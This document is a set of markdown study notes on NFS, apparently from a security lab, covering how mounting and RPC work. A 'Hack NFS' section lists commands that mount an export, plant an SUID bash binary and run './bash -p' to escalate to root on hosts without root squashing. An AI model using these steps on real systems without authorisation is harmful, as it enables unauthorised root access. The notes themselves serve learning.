# NFS

"Network File System" 

* allows a system to share directories and files with others over a network
* users and programs can access files on remote systems almost as if they were local files
* The portion of the file system that is mounted can be accessed by clients with whatever privileges are assigned to each file.

---
## How it works?

1. Client will request to mount a directory from a remote host on a local directory the same way it can mount a physical device. 
   The mount service will then act to connect to the relevant mount daemon using RPC.

2. The server checks if the user has permission to mount whatever directory has been requested. 
   It will then return a file handle which uniquely identifies each file and directory that is on the server.

3. If someone wants to access a file using NFS, an RPC call is placed to NFSD (the NFS daemon) on the server. 
   This call takes parameters such as:
   - The file handle
   - The name of the file to be accessed
   - The user's, user ID
   - The user's group ID

## Good to know
* RPC - protocol that NFS use to communicate between the server and client
* Mounting - process that allows an NFS client to interact with a remote directory as though it was a physical device

### NFS-Common
It is important to have this package installed on any machine that uses NFS, either as client or server. 
It includes programs such as: lockd, statd, showmount, nfsstat, gssd, idmapd and mount.nfs. 
Primarily, we are concerned with "showmount" and "mount.nfs" as these are going to be most useful to us when it comes to extracting information from the NFS share. 
Link: https://packages.ubuntu.com/xenial/nfs-common.

---
## Mounting NFS shares

Your client’s system needs a directory where all the content shared by the host server in the export folder can be accessed. 
You can create this folder anywhere on your system. 
Once you've created this mount point, you can use the "mount" command to connect the NFS share to the mount point on your machine.

```
sudo mount -t nfs IP:share /tmp/mount/ -nolock
```

* mount	- Execute the mount command
* -t nfs -	Type of device to mount, then specifying that it's NFS
* IP:share -	The IP Address of the NFS server, and the name of the share we wish to mount
* -nolock -	Specifies not to use NLM locking

---
### Hack NFS

List the NFS shares, what is the name of the visible share:
```
$ /usr/sbin/showmount -e <IP>
```
This output is <share> value.

Mount the share to local machine:
1. Create a directory on your machine to mount the share to
```
$ mkdir /tmp/mount
```
2. Mount the NFS share to your local machine
```
sudo mount -t nfs <IP>:<share> /tmp/mount/ -nolock
```
3. Download this script in mounted file:
https://github.com/polo-sec/writing/blob/master/Security%20Challenge%20Walkthroughs/Networks%202/bash
Add it to user mounted home.

4. Add the SUID bit permission to the bash executable
```
sudo chmod +sx bash
```
Output should be `-rwSr-Sr-x`

5. SSH into the machine as the user
```
ssh -i <key-file> <username>@<ip>
```

6. Execute the bash to escalate priviliges to root
```
./bash -p
```
---

### Root Squashing
By default, on NFS shares- Root Squashing is enabled, and prevents anyone connecting to the NFS share from having root access to the NFS volume. 
Remote root users are assigned a user “nfsnobody” when connected, which has the least local privileges. 
If this is turned off, it can allow the creation of SUID bit files, allowing a remote user root access to the connected system.

#### What are files with the SUID bit set? 
This means that the file or files can be run with the permissions of the file(s) owner/group, eg. as the super-user. 



